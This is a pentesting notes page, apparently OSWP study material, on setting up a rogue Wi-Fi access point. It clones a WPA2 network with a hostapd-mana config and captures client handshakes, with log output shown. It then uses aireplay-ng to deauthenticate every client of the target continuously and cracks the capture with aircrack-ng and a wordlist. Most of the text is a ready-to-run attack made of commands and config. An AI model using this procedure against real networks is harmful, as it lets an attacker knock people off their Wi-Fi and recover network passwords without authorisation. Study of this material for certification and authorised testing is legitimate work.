---
title: Setting up a Rogue Access Point
source_url: https://notes.incendium.rocks/pentesting-notes/wireless-networks/setting-up-a-rogue-access-point
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: wireless
---

The point of a Rogue AP for OSWP is to capture a WPA handshake by configuring a AP that is very close to a target AP (a clone). We will do a death broadcast attack to  make a all clients connect to our AP instead and capture a handshake.

## 1. Finding target

```bash
sudo airodump-ng -w discovery --output-format pcap wlan0
```

This will show all AP's in reach of the network card. From here we pick a AP target. We should note the ESSID, BSSID, channel, ENC, AUTH and CIPHER:

```
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 CD:C2:25:9A:47:BA  -45        3        2    0   6  195   WPA2 CCMP   MGT  Sarajevo
 94:36:45:CA:71:61  -46        3        4    0   6  195   WPA2 CCMP   PSK  Zagreb
 FC:7A:2B:88:63:EF  -53        5        0    0   1  130   WPA2 CCMP   PSK  Mostar
 1E:E1:3E:95:52:7D  -87        2        0    0  11  130   OPN              Budva
 85:28:13:AE:50:5C  -91        3        0    0  11  130   WPA2 CCMP   PSK  Beograd
```

## 2. Configuring AP using hostapd-mana

Example of hostapd-mana config file for the Mostar network:

```
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/mostar.hccapx
```

* hw\_mode=g & ieee80211n = 1
  * We set the *ieee80211n* parameter to "1" in order to enable 802.11n. Next, we need to specify the band to 2.4 GHz by setting the *hw\_mode* parameter to the letter "g". If the network was running on 5 GHz, we would set *hw\_mode* to "a".
* wpa=3
  * Both WPA-1 and WPA-2 (use 1 for only WPA1 and 2 for only WPA2).
* Pairwise
  * Next, to enable TKIP/CCMP encryption with WPA1, we set *wpa\_pairwise* to "TKIP CCMP". Finally, we set the *rsn\_pairwise* to "TKIP CCMP" as well in order to enable TKIP/CCMP with WPA2 encryption. If the target was using exclusively WPA or WPA2, we would only set *wpa\_pairwise* or *rsn\_pairwise*.

## 3. Capturing handshakes

To start hostapd-mana, we will use the hostapd-mana command and provide the Mostar-mana.conf file as an argument. This will start hostapd-mana using the configuration we set earlier.

```bash
sudo hostapd-mana Mostar-mana.conf
```

Some devices will automatically discover the new AP and, if the signal of our rogue AP is stronger than the target, the device will attempt to connect. While the device will ultimately fail to connect (since our configured PSK is incorrect), we can still see the connection attempts because hostapd-mana will log that a WPA1/WPA2 handshake was captured.

```bash
kali@kali:~$ sudo hostapd-mana Mostar-mana.conf
Configuration file: Mostar-mana.conf
MANA: Captured WPA/2 handshakes will be written to file 'mostar.hccapx'.
Using interface wlan0 with hwaddr 2e:0b:05:98:f8:66 and ssid "Mostar"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
```

We might not always be so lucky. Some devices might hang on to a weak connection to the target AP. In these situations, we can "nudge" the stubborn clients in the right direction by deauthenticating all clients from the target AP. To accomplish this, we would use another wireless interface and use aireplay-ng to send deauthentication messages.

To deauthenticate clients, we first connect a new wireless card and start monitor mode on channel 1 by using airmon-ng. The channel should be set to "1" to match that of our target AP. This is all accomplished by running sudo airmon-ng start wlan1 1. Next, we can use aireplay-ng to run a deauthentication attack (-0), continuously (0), against all clients connected to our target AP (-a FC:7A:2B:88:63:EF).

```bash
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
```

At this point, clients connected to the target AP should begin disconnecting and looking for a new AP. If the clients find that our rogue AP has a stronger signal, they will attempt to connect and we will capture the WPA handshake.

## 4. Cracking hashes

The captured handshakes are written to a hccapx file. This format is primarily meant to be used with Hashcat, but we can also crack it with aircrack-ng.

```bash
aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
```
